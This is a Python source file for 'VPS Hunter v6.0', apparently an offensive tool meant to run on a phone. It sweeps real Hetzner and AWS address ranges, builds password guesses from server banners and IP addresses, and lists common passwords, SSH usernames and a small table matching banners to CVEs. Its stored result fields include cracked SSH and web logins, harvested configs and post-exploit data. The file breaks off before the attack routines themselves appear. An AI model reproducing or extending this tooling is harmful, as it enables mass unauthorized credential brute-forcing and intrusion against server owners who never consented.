#!/usr/bin/env python3
# VPS Hunter v6.0 - Termux Optimized | Pure Python Async | No Root Required
# For LO. The pocket-sized predator that never stops hunting.

import asyncio
import ipaddress
import json
import random
import sys
import time
import os
import math
import re
import sqlite3
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple, AsyncGenerator, Set, Iterator

try:
    import asyncssh
    ASYNCSSH_AVAILABLE = True
except ImportError:
    ASYNCSSH_AVAILABLE = False
    try:
        import paramiko
        PARAMIKO_AVAILABLE = True
    except ImportError:
        PARAMIKO_AVAILABLE = False

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[0m"
BOLD = "\033[1m"

IS_TERMUX = os.path.exists("/data/data/com.termux/files/usr/bin/pkg") or \
            os.environ.get("TERMUX_VERSION") is not None or \
            os.path.exists("/data/data/com.termux")


@dataclass
class Target:
    ip: str
    port: int
    provider: str
    region: str

@dataclass
class ScanResult:
    ip: str
    port: int
    alive: bool = False
    os_guess: Optional[str] = None
    os_confidence: float = 0.0
    banner: Optional[str] = None
    vulns: List[Dict] = None
    ssh_cracked: Optional[Dict] = None
    web_cracked: Optional[Dict] = None
    cves: List[Dict] = None
    config_harvested: Optional[Dict] = None
    post_exploit: Optional[Dict] = None
    response_time_ms: float = 0.0
    error: Optional[str] = None
    tls_valid: Optional[bool] = None
    scan_time: str = ""

    def __post_init__(self):
        if self.vulns is None:
            self.vulns = []
        if self.cves is None:
            self.cves = []
        if not self.scan_time:
            self.scan_time = datetime.now().isoformat()


class BloomFilter:
    def __init__(self, expected_items: int = 5_000_000, false_positive_rate: float = 0.01):
        self.size = self._optimal_size(expected_items, false_positive_rate)
        self.hash_count = self._optimal_hash_count(self.size, expected_items)
        self.bit_array = bytearray(self.size // 8 + 1)
        self.items_added = 0

    def _optimal_size(self, n: int, p: float) -> int:
        return int(-(n * math.log(p)) / (math.log(2) ** 2))

    def _optimal_hash_count(self, m: int, n: int) -> int:
        return max(1, int((m / n) * math.log(2)))

    def _hashes(self, item: str):
        h1 = hash(item) % self.size
        h2 = (hash(item + "_salt_LO") % self.size) | 1
        for i in range(self.hash_count):
            yield (h1 + i * h2) % self.size

    def add(self, item: str):
        for bit_pos in self._hashes(item):
            byte_index = bit_pos // 8
            bit_index = bit_pos % 8
            self.bit_array[byte_index] |= (1 << bit_index)
        self.items_added += 1

    def __contains__(self, item: str) -> bool:
        for bit_pos in self._hashes(item):
            byte_index = bit_pos // 8
            bit_index = bit_pos % 8
            if not (self.bit_array[byte_index] & (1 << bit_index)):
                return False
        return True

    def memory_usage_mb(self) -> float:
        return len(self.bit_array) / (1024 * 1024)


class AggressiveWordlistGenerator:
    BASE_PASSWORDS = [
        "password", "admin", "root", "123456", "12345678", "qwerty",
        "letmein", "welcome", "monkey", "dragon", "master", "login",
        "pass", "secret", "default", "test", "guest", "user", "demo",
        "changeme", "password1", "password123", "admin123", "root123",
        "toor", "ubuntu", "debian", "centos", "redhat", "fedora",
        "alpine", "docker", "kubernetes", "vps", "server", "host",
        "web", "db", "database", "mysql", "postgres", "mongo", "redis",
        "elastic", "nginx", "apache", "httpd", "phpmyadmin", "wordpress",
        "wp", "joomla", "drupal", "laravel", "django", "flask", "rails",
        "node", "nodejs", "npm", "yarn", "git", "github", "gitlab",
        "ansible", "puppet", "chef", "salt", "terraform", "aws", "amazon",
        "ec2", "ec2-user", "s3", "lambda", "azure", "gcp", "google",
        "hetzner", "hcloud", "digitalocean", "do", "linode", "vultr",
        "ovh", "scaleway", "contabo", "netcup", "ionos", "strato",
        "1und1", "oracle", "administrator", "system", "sysadmin",
        "support", "service", "ftp", "mail", "www", "webmaster",
        "postmaster", "hostmaster", "info", "sales", "marketing",
        "billing", "noc", "security", "backup", "monitor", "monitoring",
        "grafana", "prometheus", "elk", "kibana", "logstash", "jenkins",
        "gitlab-ci", "travis", "circleci", "dockerhub", "registry",
        "nexus", "artifactory", "sonarqube", "jira", "confluence",
        "wiki", "forum", "blog", "shop", "store", "api", "dev", "prod",
        "staging", "test", "qa", "uat", "demo", "sandbox", "playground",
    ]

    YEARS = ["2020", "2021", "2022", "2023", "2024", "2025", "2026"]
    SEASONS = ["spring", "summer", "autumn", "winter", "fall"]
    MONTHS = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"]

    SUFFIXES = ["123", "1234", "12345", "123456", "1", "01", "00", "!", "@", "#", "$", "%",
                "2024", "2025", "2026", "admin", "root", "pass", "pwd", "pw", "user",
                "123!", "123@", "123#", "1!", "1@", "!!", "@@", "##", "$$"]

    KEYBOARD_WALKS = [
        "qwerty", "qwertz", "asdfgh", "zxcvbn", "123456", "qazwsx",
        "1q2w3e", "password", "letmein", "welcome", "qwertyuiop",
        "asdfghjkl", "zxcvbnm", "qweasd", "wasd", "wASD", "123qwe",
        "1qaz2wsx", "zaq12wsx", "q1w2e3r4", "qwer1234", "asdf1234",
    ]

    LEET_MAP = {
        "a": ["@", "4"], "e": ["3"], "i": ["1", "!"], "o": ["0"],
        "s": ["5", "$"], "t": ["7"], "l": ["1"], "g": ["9"],
        "b": ["8"], "z": ["2"],
    }

    COMMON_PASSWORDS = [
        "123456", "password", "12345678", "qwerty", "123456789", "letmein",
        "1234567", "football", "iloveyou", "admin", "welcome", "monkey",
        "login", "abc123", "111111", "123123", "password123", "dragon",
        "sunshine", "princess", "adobe123", "baseball", "football1",
        "master", "michael", "shadow", "superman", "696969", "batman",
        "trustno1", "access", "mustang", "maggie", "121212", "starwars",
        "bailey", "passw0rd", "master1", "hello", "freedom", "whatever",
        "qazwsx", "jordan", "jennifer", "harley", "robert", "matthew",
        "daniel", "andrew", "joshua", "pepper", "ginger", "tigger",
        "amanda", "ashley", "summer", "taylor", "samantha", "jessica",
        "morgan", "thomas", "hunter", "ranger", "buster", "soccer",
        "hockey", "killer", "george", "sexy", "charlie", "maggie",
        "forever", "jasmine", "orange", "merlin", "diamond", "corvette",
        "martin", "heather", "secret", "fuckyou", "pussy", "6969",
        "qwertyuiop", "123321", "mustang", "access", "love", "fuckme",
        "iwantu", "hunter", "fuck", "2000", "test",
        "thomas", "robert", "access", "love", "buster",
        "soccer", "hockey", "killer", "george", "sexy", "charlie",
        "superman", "asshole", "fuckyou", "dallas", "jessica", "panties",
        "pepper", "1111", "austin", "william", "daniel", "golfer",
        "summer", "heather", "hammer", "yankees", "joshua", "biteme",
        "enter", "ashley", "thunder", "cowboy", "silver", "richard",
        "fucker", "orange", "merlin", "michelle", "corvette", "bigdog",
        "cheese", "matthew", "121212", "patrick", "martin", "freedom",
        "ginger", "blowjob", "nicole", "sparky", "yellow", "camaro",
        "secret", "dick", "falcon", "taylor", "111111", "131313",
        "123123", "bitch", "hello", "scooter", "please", "porsche",
        "guitar", "chelsea", "black", "diamond", "nascar", "jackson",
        "cameron", "654321", "computer", "amanda", "wizard",
        "xxxxxxxx", "money", "phoenix", "mickey", "bailey", "knight",
        "iceman", "tigers", "purple", "andrea", "horny", "dakota",
        "aaaaaa", "player", "sunshine", "morgan", "starwars", "boomer",
        "cowboys", "edward", "burns", "johnny", "airborne", "bear",
        "america", "vision", "tiffany", "mary", "golfer", "iloveyou",
        "jackie", "spider", "debbie", "mountain", "nathan", "rabbit",
        "angels", "trouble", "united", "victory", "chicago", "dolphin",
        "captain", "bandit", "greenday", "hannah", "miller", "scorpion",
        "sierra", "peaches", "veronica", "chicken", "oliver", "gemini",
        "winston", "warrior", "eagle1", "lakers", "player", "mookie",
        "rocket", "legend", "eminem", "metallica", "doggie", "packers",
        "newyork", "panther", "yamaha", "justin", "ferrari", "blonde",
        "jasper", "doctor", "speedy", "penguin", "magnet", "crystal",
        "broncos", "wildcats", "billie", "cocacola", "chucky", "yuantoo",
        "bronco", "private", "falcon", "cookie", "natasha", "brandon",
        "maverick", "swordfish", "porsche", "christian", "wallace",
        "snoopy", "booboo", "raiders", "maddog", "hendrix", "samsung",
        "skippy", "tomcat", "dustin", "redskins", "butthead", "eagles",
        "chicken", "viper", "peppers", "tornado", "monster", "flowers",
        "testing", "alexis", "pookie", "chanel", "trinity", "willie",
        "zxcvbnm", "nirvana", "voodoo", "spanky", "magic", "apollo",
        "firebird", "river", "florida", "ocean", "pirate", "college",
        "rachel", "redsox", "thx1138", "asdf", "asdfg", "asdfgh",
        "asdfghjkl", "qweasd", "qweasdzxc", "1qazxsw2", "zaq1xsw2",
        "1q2w3e4r", "1q2w3e4r5t", "qwerty123", "qwerty1", "qwerty12",
        "qwerty1234", "qwerty12345", "password1", "password12",
        "password123", "password1234", "password12345", "admin1", "admin12",
        "admin123", "admin1234", "admin12345", "root1", "root12", "root123",
        "root1234", "root12345", "user1", "user12", "user123", "user1234",
        "test1", "test12", "test123", "test1234", "guest1", "guest12",
        "guest123", "demo1", "demo12", "demo123", "login1", "login12",
        "login123", "pass1", "pass12", "pass123", "pass1234", "secret1",
        "secret12", "secret123", "default1", "default12", "default123",
    ]

    def __init__(self):
        self.generated: Set[str] = set()
        self.banner_words: Set[str] = set()
        self._base_set = set(self.BASE_PASSWORDS)

    def extract_banner_words(self, banner: str) -> List[str]:
        if not banner:
            return []
        words = []
        banner_lower = banner.lower()

        # Extract version numbers using simple string operations instead of complex regex
        import re as _re
        version_patterns = [
            _re.compile(r'([a-zA-Z]+)[/\s-](\d+)\.(\d+)(?:\.(\d+))?'),
            _re.compile(r'([a-zA-Z]+)\s+v?(\d+)\.(\d+)(?:\.(\d+))?'),
        ]
        for pattern in version_patterns:
            matches = pattern.findall(banner)
            for match in matches:
                name = match[0].lower()
                major = match[1]
                minor = match[2]
                patch = match[3] if len(match) > 3 and match[3] else ""
                words.append(name)
                words.append(f"{name}{major}")
                words.append(f"{name}{major}{minor}")
                if patch:
                    words.append(f"{name}{major}{minor}{patch}")
                    words.append(f"{name}{major}.{minor}.{patch}")

        # Extract server names and OS
        server_patterns = [
            _re.compile(r'server:\s*([^\s/]+)'),
            _re.compile(r'([a-zA-Z]+)/\d+\.\d+'),
            _re.compile(r'(ubuntu|debian|centos|red hat|fedora|alpine|windows|arch|gentoo)'),
            _re.compile(r'(nginx|apache|iis|caddy|lighttpd|tomcat|jetty)'),
            _re.compile(r'(mysql|postgresql|mariadb|mongodb|redis|elasticsearch)'),
            _re.compile(r'(openssh|dropbear|libssh)'),
            _re.compile(r'(php|python|ruby|node|java|go|rust)'),
        ]
        for pattern in server_patterns:
            matches = pattern.findall(banner_lower)
            words.extend(matches)

        # Extract domain names
        domain_pattern = _re.compile(r'([a-zA-Z0-9-]+\.(?:com|net|org|io|dev|app|cloud|tech|site))')
        domains = domain_pattern.findall(banner_lower)
        for domain in domains:
            words.append(domain.split(".")[0])
            words.append(domain)

        # Extract IP-related words
        ip_pattern = _re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        ips = ip_pattern.findall(banner)
        for ip in ips:
            octets = ip.split(".")
            words.extend(octets)
            words.append(f"{octets[2]}{octets[3]}")
            words.append(f"{octets[3]}{octets[2]}")

        clean_words = []
        for w in words:
            w = w.strip().lower()
            if len(w) >= 2 and w not in clean_words:
                clean_words.append(w)
        self.banner_words.update(clean_words)
        return clean_words

    def leet_mutate(self, word: str) -> List[str]:
        mutations = [word, word.lower(), word.upper(), word.capitalize()]
        for char, replacements in self.LEET_MAP.items():
            if char in word.lower():
                for rep in replacements:
                    new_word = word.lower().replace(char, rep)
                    if new_word not in mutations:
                        mutations.append(new_word)
        return mutations

    def _generate_mutations(self, word: str) -> Iterator[str]:
        for mutated in self.leet_mutate(word):
            yield mutated
            for suffix in self.SUFFIXES:
                yield f"{mutated}{suffix}"
                yield f"{suffix}{mutated}"
            for year in self.YEARS:
                yield f"{mutated}{year}"
                yield f"{year}{mutated}"
                yield f"{mutated.capitalize()}{year}"
                yield f"{mutated.capitalize()}{year}!"
            for season in self.SEASONS:
                yield f"{mutated}{season}"
                yield f"{mutated}{season}2024"
                yield f"{mutated}{season}2025"
            for month in self.MONTHS:
                yield f"{mutated}{month}"
                yield f"{mutated}{month}2024"
            yield f"{mutated}123!"
            yield f"{mutated}@123"
            yield f"{mutated}#123"
            yield f"{mutated}2024!"
            yield f"{mutated}2025!"
            yield f"123{mutated}"
            yield f"@{mutated}"
            yield f"#{mutated}"

    def generate_stream(self, banner: Optional[str] = None,
                        os_guess: Optional[str] = None,
                        ip: Optional[str] = None,
                        max_size: int = 500) -> Iterator[str]:
        seen = set()
        count = 0

        if ip:
            octets = ip.split(".")
            ip_passwords = [
                ip, ip.replace(".", ""),
                octets[3], octets[2], octets[2] + octets[3],
                octets[3] + octets[2], octets[0] + octets[1],
            ]
            for p in ip_passwords:
                if p not in seen and len(p) >= 3:
                    seen.add(p)
                    yield p
                    count += 1
                    if count >= max_size:
                        return

        if os_guess:
            os_lower = os_guess.lower()
            os_passwords = {
                "ubuntu": ["ubuntu", "ubuntu123", "ubuntuserver", "ubuntu2024", "ubuntu2025"],
                "debian": ["debian", "debian123", "debian12", "debian11", "debian10"],
                "centos": ["centos", "centos123", "centos7", "centos8", "centosstream"],
                "red hat": ["redhat", "redhat123", "rhel", "rhel8", "rhel9"],
                "fedora": ["fedora", "fedora123", "fedora38", "fedora39", "fedora40"],
                "alpine": ["alpine", "alpine123", "alpinelinux"],
                "windows": ["administrator", "Admin123", "Password1", "Windows1", "windows2024"],
                "arch": ["arch", "archlinux", "arch123"],
            }
            for key, vals in os_passwords.items():
                if key in os_lower:
                    for p in vals:
                        if p not in seen:
                            seen.add(p)
                            yield p
                            count += 1
                            if count >= max_size:
                                return

        service_passwords = {
            "nginx": ["nginx", "nginx123", "nginxadmin", "webmaster"],
            "apache": ["apache", "apache123", "apache2", "httpd", "httpd123"],
            "mysql": ["mysql", "mysql123", "mysqladmin", "sql", "database"],
            "postgres": ["postgres", "postgres123", "postgresql", "pgadmin"],
            "redis": ["redis", "redis123", "redispass"],
            "mongo": ["mongo", "mongodb", "mongo123", "mongoadmin"],
            "wordpress": ["wordpress", "wp", "wpadmin", "wordpress123"],
            "phpmyadmin": ["phpmyadmin", "pma", "phpmyadmin123"],
            "jenkins": ["jenkins", "jenkins123", "jenkinsadmin"],
            "gitlab": ["gitlab", "gitlab123", "gitlabadmin"],
            "docker": ["docker", "docker123", "container", "dockerhub"],
        }
        if banner:
            banner_lower = banner.lower()
            for service, vals in service_passwords.items():
                if service in banner_lower:
                    for p in vals:
                        if p not in seen:
                            seen.add(p)
                            yield p
                            count += 1
                            if count >= max_size:
                                return

        banner_words = self.extract_banner_words(banner) if banner else []
        for w in banner_words:
            if w not in seen:
                seen.add(w)
                yield w
                count += 1
                if count >= max_size:
                    return

        all_base = list(self._base_set)
        random.shuffle(all_base)
        for word in all_base:
            for mutated in self._generate_mutations(word):
                if mutated not in seen and len(mutated) >= 3:
                    seen.add(mutated)
                    yield mutated
                    count += 1
                    if count >= max_size:
                        return

        for walk in self.KEYBOARD_WALKS:
            if walk not in seen:
                seen.add(walk)
                yield walk
                count += 1
                if count >= max_size:
                    return

        for common in self.COMMON_PASSWORDS:
            if common not in seen:
                seen.add(common)
                yield common
                count += 1
                if count >= max_size:
                    return

        for i in range(1000):
            p = str(i)
            if p not in seen:
                seen.add(p)
                yield p
                count += 1
                if count >= max_size:
                    return
            p = f"{i:03d}"
            if p not in seen:
                seen.add(p)
                yield p
                count += 1
                if count >= max_size:
                    return

        for year in range(1990, 2027):
            p = str(year)
            if p not in seen:
                seen.add(p)
                yield p
                count += 1
                if count >= max_size:
                    return

    def generate_for_ssh(self, banner: Optional[str] = None,
                         os_guess: Optional[str] = None,
                         ip: Optional[str] = None,
                         max_size: int = 500) -> List[str]:
        return list(self.generate_stream(banner, os_guess, ip, max_size))

    def generate_for_web(self, banner: Optional[str] = None,
                         path: str = "",
                         ip: Optional[str] = None,
                         max_size: int = 300) -> List[str]:
        passwords = list(self.generate_stream(banner, None, ip, max_size))
        path_lower = path.lower()
        extras = []
        if "wp-admin" in path_lower:
            extras = ["wordpress", "wp", "wpadmin", "admin", "password", "wordpress123"]
        elif "phpmyadmin" in path_lower:
            extras = ["phpmyadmin", "pma", "root", "admin", "phpmyadmin123"]
        elif "admin" in path_lower:
            extras = ["admin", "admin123", "administrator", "password", "login"]
        elif "jenkins" in path_lower:
            extras = ["jenkins", "jenkins123", "admin", "password"]
        elif "gitlab" in path_lower:
            extras = ["gitlab", "gitlab123", "root", "admin"]
        for e in extras:
            if e not in passwords:
                passwords.insert(0, e)
        return passwords[:max_size]


class SQLiteStore:
    def __init__(self, db_path: str = "vps_hunter.db"):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("""
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT, port INTEGER, alive INTEGER,
                os_guess TEXT, os_confidence REAL, banner TEXT,
                vulns TEXT, ssh_cracked TEXT, web_cracked TEXT,
                cves TEXT, config_harvested TEXT, post_exploit TEXT,
                response_time_ms REAL, error TEXT, tls_valid INTEGER,
                scan_time TEXT, session_id TEXT
            )
        """)
        c.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY, provider TEXT, region TEXT,
                target_count INTEGER, started TEXT, completed TEXT, stats TEXT
            )
        """)
        c.execute("""
            CREATE TABLE IF NOT EXISTS scanned_ips (
                ip TEXT PRIMARY KEY, port INTEGER, scanned_at TEXT
            )
        """)
        c.execute("CREATE INDEX IF NOT EXISTS idx_results_session ON results(session_id)")
        conn.commit()
        conn.close()

    def save_result(self, result: ScanResult, session_id: str):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("""
            INSERT INTO results
            (ip, port, alive, os_guess, os_confidence, banner, vulns, ssh_cracked,
             web_cracked, cves, config_harvested, post_exploit, response_time_ms,
             error, tls_valid, scan_time, session_id)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            result.ip, result.port, int(result.alive), result.os_guess,
            result.os_confidence, result.banner,
            json.dumps(result.vulns) if result.vulns else None,
            json.dumps(result.ssh_cracked) if result.ssh_cracked else None,
            json.dumps(result.web_cracked) if result.web_cracked else None,
            json.dumps(result.cves) if result.cves else None,
            json.dumps(result.config_harvested) if result.config_harvested else None,
            json.dumps(result.post_exploit) if result.post_exploit else None,
            result.response_time_ms, result.error,
            int(result.tls_valid) if result.tls_valid is not None else None,
            result.scan_time, session_id
        ))
        conn.commit()
        conn.close()

    def is_scanned(self, ip: str, port: int) -> bool:
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT 1 FROM scanned_ips WHERE ip = ? AND port = ?", (ip, port))
        result = c.fetchone() is not None
        conn.close()
        return result

    def mark_scanned(self, ip: str, port: int):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO scanned_ips (ip, port, scanned_at) VALUES (?, ?, ?)",
                  (ip, port, datetime.now().isoformat()))
        conn.commit()
        conn.close()

    def get_session_results(self, session_id: str) -> List[Dict]:
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT * FROM results WHERE session_id = ?", (session_id,))
        cols = [d[0] for d in c.description]
        rows = c.fetchall()
        conn.close()
        results = []
        for row in rows:
            d = dict(zip(cols, row))
            for key in ["vulns", "ssh_cracked", "web_cracked", "cves", "config_harvested", "post_exploit"]:
                if d.get(key):
                    try:
                        d[key] = json.loads(d[key])
                    except:
                        pass
            results.append(d)
        return results

    def start_session(self, session_id: str, provider: str, region: str, count: int):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("""
            INSERT OR REPLACE INTO sessions (session_id, provider, region, target_count, started)
            VALUES (?, ?, ?, ?, ?)
        """, (session_id, provider, region, count, datetime.now().isoformat()))
        conn.commit()
        conn.close()

    def complete_session(self, session_id: str, stats: Dict):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("""
            UPDATE sessions SET completed = ?, stats = ? WHERE session_id = ?
        """, (datetime.now().isoformat(), json.dumps(stats), session_id))
        conn.commit()
        conn.close()


class VPSHunter:
    def __init__(self, max_concurrent: int = 8, rate_limit: float = 0.1,
                 db_path: str = "vps_hunter.db"):
        if IS_TERMUX:
            self.max_concurrent = min(max_concurrent, 8)
            self.rate_limit = max(rate_limit, 0.1)
            self.connect_timeout = 8
            self.read_timeout = 10
            self.ssh_batch_size = 3
        else:
            self.max_concurrent = max_concurrent
            self.rate_limit = rate_limit
            self.connect_timeout = 5
            self.read_timeout = 8
            self.ssh_batch_size = 5

        self.results: List[ScanResult] = []
        self.wordlist_gen = AggressiveWordlistGenerator()
        self.session = None
        self.seen_ips = BloomFilter(expected_items=5_000_000, false_positive_rate=0.01)
        self.store = SQLiteStore(db_path)
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.stats = {
            "scanned": 0, "alive": 0, "vulnerable": 0, "cracked": 0,
            "web_cracked": 0, "config_harvested": 0, "post_exploit_success": 0,
            "errors": 0, "start_time": None
        }
        self._ssh_semaphore = asyncio.Semaphore(self.max_concurrent // 2 if IS_TERMUX else self.max_concurrent)
        self._harvested_passwords: Set[str] = set()

        self.cloud_ranges = {
            "hetzner": {
                "de": [
                    (ipaddress.ip_network("88.99.0.0/16"), 65534),
                    (ipaddress.ip_network("116.203.0.0/16"), 65534),
                    (ipaddress.ip_network("159.69.0.0/16"), 65534),
                    (ipaddress.ip_network("78.46.0.0/15"), 131070),
                    (ipaddress.ip_network("136.243.0.0/16"), 65534),
                    (ipaddress.ip_network("148.251.0.0/16"), 65534),
                    (ipaddress.ip_network("162.55.0.0/16"), 65534),
                    (ipaddress.ip_network("195.201.0.0/16"), 65534),
                    (ipaddress.ip_network("213.133.96.0/19"), 8190),
                    (ipaddress.ip_network("213.239.192.0/18"), 16382),
                ],
                "us": [
                    (ipaddress.ip_network("5.161.0.0/16"), 65534),
                    (ipaddress.ip_network("5.223.0.0/16"), 65534),
                    (ipaddress.ip_network("65.109.0.0/16"), 65534),
                    (ipaddress.ip_network("142.132.0.0/16"), 65534),
                    (ipaddress.ip_network("37.16.0.0/16"), 65534),
                    (ipaddress.ip_network("128.140.0.0/16"), 65534),
                ]
            },
            "aws": {
                "de": [
                    (ipaddress.ip_network("3.120.0.0/14"), 262142),
                    (ipaddress.ip_network("3.64.0.0/12"), 1048574),
                    (ipaddress.ip_network("18.184.0.0/15"), 131070),
                    (ipaddress.ip_network("18.192.0.0/15"), 131070),
                    (ipaddress.ip_network("35.156.0.0/14"), 262142),
                    (ipaddress.ip_network("52.28.0.0/16"), 65534),
                    (ipaddress.ip_network("52.29.0.0/16"), 65534),
                    (ipaddress.ip_network("52.58.0.0/16"), 65534),
                    (ipaddress.ip_network("52.59.0.0/16"), 65534),
                    (ipaddress.ip_network("52.93.0.0/16"), 65534),
                    (ipaddress.ip_network("54.93.0.0/16"), 65534),
                ],
                "us": {
                    "us-east-1": [
                        (ipaddress.ip_network("3.80.0.0/12"), 1048574),
                        (ipaddress.ip_network("3.208.0.0/12"), 1048574),
                        (ipaddress.ip_network("13.32.0.0/15"), 131070),
                        (ipaddress.ip_network("18.204.0.0/14"), 262142),
                        (ipaddress.ip_network("34.192.0.0/12"), 1048574),
                        (ipaddress.ip_network("44.192.0.0/11"), 2097150),
                        (ipaddress.ip_network("50.16.0.0/15"), 131070),
                        (ipaddress.ip_network("52.0.0.0/15"), 131070),
                        (ipaddress.ip_network("52.20.0.0/14"), 262142),
                        (ipaddress.ip_network("52.54.0.0/15"), 131070),
                        (ipaddress.ip_network("52.70.0.0/15"), 131070),
                        (ipaddress.ip_network("52.86.0.0/15"), 131070),
                        (ipaddress.ip_network("52.90.0.0/15"), 131070),
                        (ipaddress.ip_network("54.80.0.0/14"), 262142),
                        (ipaddress.ip_network("54.152.0.0/16"), 65534),
                        (ipaddress.ip_network("54.156.0.0/14"), 262142),
                        (ipaddress.ip_network("54.172.0.0/15"), 131070),
                        (ipaddress.ip_network("54.196.0.0/15"), 131070),
                        (ipaddress.ip_network("54.208.0.0/15"), 131070),
                        (ipaddress.ip_network("54.210.0.0/16"), 65534),
                        (ipaddress.ip_network("54.221.0.0/16"), 65534),
                        (ipaddress.ip_network("54.224.0.0/15"), 131070),
                        (ipaddress.ip_network("54.226.0.0/15"), 131070),
                        (ipaddress.ip_network("54.234.0.0/15"), 131070),
                        (ipaddress.ip_network("54.236.0.0/15"), 131070),
                        (ipaddress.ip_network("54.239.0.0/16"), 65534),
                        (ipaddress.ip_network("54.240.0.0/15"), 131070),
                        (ipaddress.ip_network("54.242.0.0/15"), 131070),
                        (ipaddress.ip_network("54.243.0.0/16"), 65534),
                        (ipaddress.ip_network("67.202.0.0/18"), 16382),
                        (ipaddress.ip_network("75.101.128.0/17"), 32766),
                        (ipaddress.ip_network("107.20.0.0/14"), 262142),
                        (ipaddress.ip_network("174.129.0.0/16"), 65534),
                        (ipaddress.ip_network("184.72.0.0/15"), 131070),
                        (ipaddress.ip_network("204.236.128.0/18"), 16382),
                    ],
                    "us-west-2": [
                        (ipaddress.ip_network("35.80.0.0/12"), 1048574),
                        (ipaddress.ip_network("44.224.0.0/11"), 2097150),
                        (ipaddress.ip_network("50.112.0.0/16"), 65534),
                        (ipaddress.ip_network("52.10.0.0/15"), 131070),
                        (ipaddress.ip_network("52.12.0.0/15"), 131070),
                        (ipaddress.ip_network("52.24.0.0/14"), 262142),
                        (ipaddress.ip_network("52.32.0.0/14"), 262142),
                        (ipaddress.ip_network("52.36.0.0/14"), 262142),
                        (ipaddress.ip_network("52.40.0.0/14"), 262142),
                        (ipaddress.ip_network("52.88.0.0/15"), 131070),
                        (ipaddress.ip_network("54.68.0.0/14"), 262142),
                        (ipaddress.ip_network("54.148.0.0/14"), 262142),
                        (ipaddress.ip_network("54.184.0.0/16"), 65534),
                        (ipaddress.ip_network("54.186.0.0/15"), 131070),
                        (ipaddress.ip_network("54.188.0.0/15"), 131070),
                        (ipaddress.ip_network("54.190.0.0/16"), 65534),
                        (ipaddress.ip_network("54.200.0.0/15"), 131070),
                        (ipaddress.ip_network("54.202.0.0/15"), 131070),
                        (ipaddress.ip_network("54.212.0.0/15"), 131070),
                        (ipaddress.ip_network("54.214.0.0/16"), 65534),
                        (ipaddress.ip_network("54.218.0.0/16"), 65534),
                        (ipaddress.ip_network("54.244.0.0/14"), 262142),
                        (ipaddress.ip_network("99.83.64.0/18"), 16382),
                        (ipaddress.ip_network("100.20.0.0/14"), 262142),
                    ]
                }
            }
        }

        self.common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]
        self.ssh_users = ["root", "admin", "ubuntu", "ec2-user", "debian", "user", "test", "oracle",
                         "centos", "fedora", "alpine", "docker", "vps", "server", "web", "db",
                         "mysql", "postgres", "nginx", "apache", "www-data", "nobody", "system"]

        self.max_retries = 2 if IS_TERMUX else 3
        self.retry_delay = 1.5 if IS_TERMUX else 2.0

        self.cve_db = self._init_cve_db()
        self._user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        ]

    def _init_cve_db(self) -> Dict[str, List[Dict]]:
        return {
            "apache/2.2": [
                {"id": "CVE-2017-7679", "desc": "mod_mime buffer overflow", "severity": "high"},
                {"id": "CVE-2017-9788", "desc": "mod_auth_digest uninitialized memory", "severity": "high"},
                {"id": "CVE-2016-5387", "desc": "CGI HTTPoxy", "severity": "medium"},
            ],
            "apache/2.4": [
                {"id": "CVE-2021-44790", "desc": "mod_lua buffer overflow", "severity": "critical"},
                {"id": "CVE-2021-41773", "desc": "path traversal", "severity": "critical"},
            ],
            "nginx/1.": [
                {"id": "CVE-2021-23017", "desc": "DNS resolver off-by-one", "severity": "high"},
                {"id": "CVE-2019-9511", "desc": "HTTP/2 memory exhaustion", "severity": "high"},
            ],
            "openssh_8.": [
                {"id": "CVE-2021-41617", "desc": "privilege escalation", "severity": "medium"},
            ],
            "openssh_7.": [
                {"id": "CVE-2018-15473", "desc": "user enumeration", "severity": "medium"},
            ],
            "mysql": [
                {"id": "CVE-2021-3449", "desc": "privilege escalation", "severity": "high"},
            ],
            "redis": [
                {"id": "CVE-2021-41099", "desc": "Lua sandbox escape", "severity": "high"},
            ],
            "php/5.": [
                {"id": "CVE-2019-11043", "desc": "PHP-FPM RCE", "severity": "critical"},
            ],
            "php/7.": [
                {"id": "CVE-2019-11043", "desc": "PHP-FPM RCE", "severity": "critical"},
            ],
            "wordpress": [
                {"id": "CVE-2021-29447", "desc": "XXE in media library", "severity": "high"},
            ],
        }

    def check_cves(self, banner: str) -> List[Dict]:
        if not banner:
            return []
        cves = []
        banner_lower = banner.lower()
        for pattern, cve_list in self.cve_db.items():
            if pattern in banner_lower:
                for cve in cve_list:
                    if cve not in cves:
                        cves.append(cve)
        return cves

    async def init_session(self):
        if not AIOHTTP_AVAILABLE:
            self.log("aiohttp not available. HTTP features disabled.", Y)
            return
